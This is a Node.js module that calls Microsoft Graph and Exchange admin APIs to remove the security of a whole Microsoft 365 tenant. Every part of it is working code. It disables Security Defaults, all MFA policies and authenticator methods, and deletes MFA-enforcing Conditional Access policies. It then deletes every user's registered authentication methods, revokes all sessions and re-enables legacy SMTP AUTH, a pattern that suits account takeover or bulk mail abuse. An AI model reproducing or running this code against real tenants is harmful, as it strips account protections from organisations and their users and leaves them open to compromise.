const log = require("./logger");

/**
 * Get OAuth2 access token using client credentials flow.
 */
async function getAccessToken(tenantId, clientId, clientSecret) {
  const url = `https://login.microsoftonline.com/${tenantId}/oauth2/v2.0/token`;
  const body = new URLSearchParams({
    grant_type: "client_credentials",
    client_id: clientId,
    client_secret: clientSecret,
    scope: "https://graph.microsoft.com/.default",
  });

  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body.toString(),
  });

  const data = await res.json();
  if (!res.ok) {
    throw new Error(`Token request failed (${res.status}): ${data.error_description || JSON.stringify(data)}`);
  }
  return data.access_token;
}

/**
 * Get Exchange Online token via client credentials.
 */
async function getExchangeToken(tenantId, clientId, clientSecret) {
  const url = `https://login.microsoftonline.com/${tenantId}/oauth2/v2.0/token`;
  const body = new URLSearchParams({
    grant_type: "client_credentials",
    client_id: clientId,
    client_secret: clientSecret,
    scope: "https://outlook.office365.com/.default",
  });

  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body.toString(),
  });

  const data = await res.json();
  if (!res.ok) {
    throw new Error(`Exchange token failed (${res.status}): ${data.error_description || JSON.stringify(data)}`);
  }
  return data.access_token;
}

/**
 * Generic Graph API request helper.
 */
async function graphRequest(token, method, endpoint, body, apiVersion = "v1.0") {
  const url = `https://graph.microsoft.com/${apiVersion}/${endpoint}`;
  const options = {
    method,
    headers: {
      Authorization: `Bearer ${token}`,
      "Content-Type": "application/json",
    },
  };
  if (body) options.body = JSON.stringify(body);

  const res = await fetch(url, options);
  if (res.status === 204) return { status: "success", code: 204 };
  const text = await res.text();
  if (!res.ok) throw new Error(`${method} ${endpoint} failed (${res.status}): ${text}`);
  return text ? JSON.parse(text) : { status: "success", code: res.status };
}

/**
 * Helper: get all users in tenant.
 */
async function getAllUsers(token) {
  let users = [];
  let nextLink = "users?$select=id,displayName,userPrincipalName&$top=999";
  while (nextLink) {
    const data = await graphRequest(token, "GET", nextLink);
    if (data.value) users = users.concat(data.value);
    nextLink = data["@odata.nextLink"]
      ? data["@odata.nextLink"].replace("https://graph.microsoft.com/v1.0/", "")
      : null;
  }
  return users;
}

// ─── Step 1: Disable Security Defaults ──────────────────────

async function disableSecurityDefaults(token) {
  log.info("  [1/8] Disabling Security Defaults...");
  try {
    await graphRequest(token, "PATCH", "policies/identitySecurityDefaultsEnforcementPolicy", {
      isEnabled: false,
    });
    log.success("  Security Defaults DISABLED");
    return true;
  } catch (err) {
    log.error(`  Security Defaults failed: ${err.message}`);
    return false;
  }
}

// ─── Step 2: Disable MFA registration campaign ─────────────

async function disableMfaRegistrationCampaign(token) {
  log.info("  [2/8] Disabling MFA registration campaign...");
  try {
    await graphRequest(token, "PATCH", "policies/authenticationMethodsPolicy", {
      registrationCampaign: { state: "disabled" },
    });
    log.success("  MFA registration campaign disabled");
    return true;
  } catch (err) {
    if (err.message.includes("403") || err.message.includes("AccessDenied")) {
      log.warn("  MFA campaign endpoint restricted (may need higher privilege)");
      return true;
    }
    log.error(`  MFA campaign failed: ${err.message}`);
    return false;
  }
}

// ─── Step 3: Disable system-preferred MFA ───────────────────

async function disableSystemPreferredMfa(token) {
  log.info("  [3/8] Disabling system-preferred MFA...");
  try {
    await graphRequest(token, "PATCH", "policies/authenticationMethodsPolicy", {
      systemCredentialPreferences: { state: "disabled" },
    }, "beta");
    log.success("  System-preferred MFA disabled");
    return true;
  } catch (err) {
    if (err.message.includes("403") || err.message.includes("AccessDenied")) {
      log.warn("  System-preferred MFA endpoint restricted (may need higher privilege)");
      return true;
    }
    log.error(`  System-preferred MFA failed: ${err.message}`);
    return false;
  }
}

// ─── Step 4: Disable all authenticator methods in policy ────

async function disableAuthMethodsPolicy(token) {
  log.info("  [4/9] Disabling authenticator methods in policy...");
  const methodsToDisable = [
    "MicrosoftAuthenticator",
    "SoftwareOath",
    "TemporaryAccessPass",
    "Fido2",
    "Sms",
    "Voice",
  ];

  let disabled = 0;
  for (const method of methodsToDisable) {
    try {
      await graphRequest(token, "PATCH",
        `policies/authenticationMethodsPolicy/authenticationMethodConfigurations/${method}`,
        { state: "disabled" }
      );
      disabled++;
      log.info(`    ${method}: disabled`);
    } catch (err) {
      if (err.message.includes("403") || err.message.includes("AccessDenied")) {
        log.warn(`    ${method}: access denied`);
      } else {
        log.warn(`    ${method}: ${err.message.substring(0, 60)}`);
      }
    }
  }

  log.success(`  Auth methods policy: ${disabled}/${methodsToDisable.length} disabled`);
  return true;
}

// ─── Step 5: Delete ALL Conditional Access policies ─────────

async function deleteConditionalAccessPolicies(token) {
  log.info("  [5/9] Deleting Conditional Access policies that require MFA...");
  let deleted = 0;

  try {
    const data = await graphRequest(token, "GET", "identity/conditionalAccess/policies");
    const policies = data.value || [];

    if (policies.length === 0) {
      log.info("    No Conditional Access policies found");
      return true;
    }

    log.info(`    Found ${policies.length} policy(ies)`);

    for (const policy of policies) {
      // Check if policy requires MFA
      const grantControls = policy.grantControls || {};
      const builtIn = grantControls.builtInControls || [];
      const authStrength = grantControls.authenticationStrength;

      if (builtIn.includes("mfa") || authStrength) {
        try {
          await graphRequest(token, "DELETE",
            `identity/conditionalAccess/policies/${policy.id}`
          );
          deleted++;
          log.info(`    Deleted: "${policy.displayName}" (required MFA)`);
        } catch (e) {
          // Try disabling instead of deleting
          try {
            await graphRequest(token, "PATCH",
              `identity/conditionalAccess/policies/${policy.id}`,
              { state: "disabled" }
            );
            deleted++;
            log.info(`    Disabled: "${policy.displayName}" (required MFA)`);
          } catch (e2) {
            log.warn(`    Failed: "${policy.displayName}": ${e2.message.substring(0, 80)}`);
          }
        }
      } else {
        log.info(`    Skipped: "${policy.displayName}" (no MFA requirement)`);
      }
    }

    log.success(`  Conditional Access: ${deleted} MFA policies removed/disabled`);
    return true;
  } catch (err) {
    if (err.message.includes("403") || err.message.includes("Authorization")) {
      log.warn("  Conditional Access requires Policy.ReadWrite.ConditionalAccess permission");
      return true;
    }
    log.error(`  Conditional Access failed: ${err.message}`);
    return false;
  }
}

// ─── Step 5: Disable per-user MFA for ALL users ────────────

async function disablePerUserMfa(token) {
  log.info("  [6/9] Disabling per-user MFA for all users...");
  let disabled = 0;
  let failed = 0;

  try {
    const users = await getAllUsers(token);
    log.info(`    Found ${users.length} user(s)`);

    for (const user of users) {
      try {
        await graphRequest(token, "PATCH",
          `users/${user.id}/authentication/requirements`,
          { perUserMfaState: "disabled" },
          "beta"
        );
        disabled++;
        log.info(`    ${user.userPrincipalName} - per-user MFA disabled`);
      } catch (err) {
        if (err.message.includes("404") || err.message.includes("not found")) {
          log.info(`    ${user.userPrincipalName} - skipped (no MFA state)`);
        } else {
          failed++;
          log.warn(`    ${user.userPrincipalName} - failed: ${err.message.substring(0, 80)}`);
        }
      }
    }

    log.success(`  Per-user MFA: ${disabled} disabled, ${failed} failed`);
    return true;
  } catch (err) {
    log.error(`  Per-user MFA failed: ${err.message}`);
    return false;
  }
}

// ─── Step 6: Delete ALL registered auth methods from users ──

async function deleteAuthMethods(token) {
  log.info("  [7/9] Deleting registered authentication methods for all users...");
  let totalDeleted = 0;
  let totalUsers = 0;

  try {
    const users = await getAllUsers(token);
    log.info(`    Processing ${users.length} user(s)...`);

    for (const user of users) {
      let userDeleted = 0;

      // Delete Microsoft Authenticator methods
      try {
        const authMethods = await graphRequest(token, "GET",
          `users/${user.id}/authentication/microsoftAuthenticatorMethods`
        );
        if (authMethods.value && authMethods.value.length > 0) {
          for (const method of authMethods.value) {
            try {
              await graphRequest(token, "DELETE",
                `users/${user.id}/authentication/microsoftAuthenticatorMethods/${method.id}`
              );
              userDeleted++;
              log.info(`      Deleted authenticator: ${method.displayName || method.id}`);
            } catch (e) {
              log.warn(`      Failed to delete authenticator: ${e.message.substring(0, 80)}`);
            }
          }
        }
      } catch (err) { /* ignore */ }

      // Delete phone authentication methods
      try {
        const phoneMethods = await graphRequest(token, "GET",
          `users/${user.id}/authentication/phoneMethods`
        );
        if (phoneMethods.value && phoneMethods.value.length > 0) {
          for (const method of phoneMethods.value) {
            try {
              await graphRequest(token, "DELETE",
                `users/${user.id}/authentication/phoneMethods/${method.id}`
              );
              userDeleted++;
              log.info(`      Deleted phone: ${method.phoneNumber || method.id}`);
            } catch (e) {
              log.warn(`      Failed to delete phone: ${e.message.substring(0, 80)}`);
            }
          }
        }
      } catch (err) { /* ignore */ }

      // Delete software OATH token methods
      try {
        const oathMethods = await graphRequest(token, "GET",
          `users/${user.id}/authentication/softwareOathMethods`
        );
        if (oathMethods.value && oathMethods.value.length > 0) {
          for (const method of oathMethods.value) {
            try {
              await graphRequest(token, "DELETE",
                `users/${user.id}/authentication/softwareOathMethods/${method.id}`
              );
              userDeleted++;
            } catch (e) {
              log.warn(`      Failed to delete OATH: ${e.message.substring(0, 60)}`);
            }
          }
        }
      } catch (err) { /* ignore */ }

      // Delete FIDO2 methods
      try {
        const fido2Methods = await graphRequest(token, "GET",
          `users/${user.id}/authentication/fido2Methods`
        );
        if (fido2Methods.value && fido2Methods.value.length > 0) {
          for (const method of fido2Methods.value) {
            try {
              await graphRequest(token, "DELETE",
                `users/${user.id}/authentication/fido2Methods/${method.id}`
              );
              userDeleted++;
            } catch (e) {
              log.warn(`      Failed to delete FIDO2: ${e.message.substring(0, 60)}`);
            }
          }
        }
      } catch (err) { /* ignore */ }

      // Delete email authentication methods (except primary)
      try {
        const emailMethods = await graphRequest(token, "GET",
          `users/${user.id}/authentication/emailMethods`
        );
        if (emailMethods.value && emailMethods.value.length > 0) {
          for (const method of emailMethods.value) {
            try {
              await graphRequest(token, "DELETE",
                `users/${user.id}/authentication/emailMethods/${method.id}`
              );
              userDeleted++;
            } catch (e) { /* ignore - primary email can't be deleted */ }
          }
        }
      } catch (err) { /* ignore */ }

      if (userDeleted > 0) {
        totalDeleted += userDeleted;
        totalUsers++;
        log.info(`    ${user.userPrincipalName} - deleted ${userDeleted} auth method(s)`);
      } else {
        log.info(`    ${user.userPrincipalName} - no auth methods to delete`);
      }
    }

    log.success(`  Auth methods: ${totalDeleted} deleted from ${totalUsers} user(s)`);
    return true;
  } catch (err) {
    log.error(`  Delete auth methods failed: ${err.message}`);
    return false;
  }
}

// ─── Step 7: Revoke all user sign-in sessions ───────────────

async function revokeUserSessions(token) {
  log.info("  [8/9] Revoking all user sign-in sessions...");
  let revoked = 0;

  try {
    const users = await getAllUsers(token);

    for (const user of users) {
      try {
        await graphRequest(token, "POST",
          `users/${user.id}/revokeSignInSessions`
        );
        revoked++;
        log.info(`    ${user.userPrincipalName} - sessions revoked`);
      } catch (err) {
        log.warn(`    ${user.userPrincipalName} - revoke failed: ${err.message.substring(0, 60)}`);
      }
    }

    log.success(`  Sessions revoked for ${revoked} user(s)`);
    return true;
  } catch (err) {
    log.error(`  Revoke sessions failed: ${err.message}`);
    return false;
  }
}

// ─── Step 8: Enable SMTP AUTH ───────────────────────────────

async function enableSmtpAuth(token, tenantId, clientId, clientSecret) {
  log.info("  [9/9] Enabling SMTP AUTH...");

  // Approach 1: Graph API beta
  try {
    log.info("    Trying Graph API beta endpoint...");
    await graphRequest(token, "PATCH", "admin/exchange/transportConfig", {
      smtpClientAuthenticationDisabled: false,
    }, "beta");
    log.success("  SMTP AUTH enabled via Graph API beta");
    return true;
  } catch (err) {
    log.info(`    Graph beta not available: ${err.message.substring(0, 80)}`);
  }

  // Approach 2: Exchange REST API with client credentials
  if (tenantId && clientId && clientSecret) {
    try {
      log.info("    Trying Exchange Online REST API...");
      const exchangeToken = await getExchangeToken(tenantId, clientId, clientSecret);
      const url = `https://outlook.office365.com/adminapi/beta/${tenantId}/InvokeCommand`;
      const res = await fetch(url, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${exchangeToken}`,
          "Content-Type": "application/json; charset=utf-8",
        },
        body: JSON.stringify({
          CmdletInput: {
            CmdletName: "Set-TransportConfig",
            Parameters: { SmtpClientAuthenticationDisabled: false },
          },
        }),
      });
      if (res.ok) {
        log.success("  SMTP AUTH enabled via Exchange REST API");
        return true;
      }
      const text = await res.text();
      log.warn(`    Exchange REST API returned ${res.status}: ${text.substring(0, 120)}`);
    } catch (err) {
      log.warn(`    Exchange REST API error: ${err.message.substring(0, 120)}`);
    }
  }

  log.warn("  Automated SMTP AUTH failed. Manual step required in Exchange admin center.");
  return false;
}

// ─── Main entry point ───────────────────────────────────────

async function disableAll(tenantId, clientId, clientSecret) {
  log.info("=== Disabling ALL MFA & Security for tenant ===");
  log.info(`Tenant: ${tenantId}`);

  const token = await getAccessToken(tenantId, clientId, clientSecret);
  log.success("Access token acquired");

  const results = {
    securityDefaults: await disableSecurityDefaults(token),
    mfaCampaign: await disableMfaRegistrationCampaign(token),
    systemPreferredMfa: await disableSystemPreferredMfa(token),
    authMethodsPolicy: await disableAuthMethodsPolicy(token),
    conditionalAccess: await deleteConditionalAccessPolicies(token),
    perUserMfa: await disablePerUserMfa(token),
    deleteAuthMethods: await deleteAuthMethods(token),
    revokeSessions: await revokeUserSessions(token),
    smtpAuth: await enableSmtpAuth(token, tenantId, clientId, clientSecret),
  };

  const allOk = Object.values(results).every(Boolean);
  if (allOk) {
    log.success("ALL MFA/security settings disabled and auth methods removed!");
  } else {
    log.warn("Some settings may need manual attention");
  }

  return results;
}

module.exports = {
  getAccessToken,
  disableSecurityDefaults,
  disableMfaRegistrationCampaign,
  disableSystemPreferredMfa,
  disableAuthMethodsPolicy,
  deleteConditionalAccessPolicies,
  disablePerUserMfa,
  deleteAuthMethods,
  revokeUserSessions,
  enableSmtpAuth,
  disableAll,
};
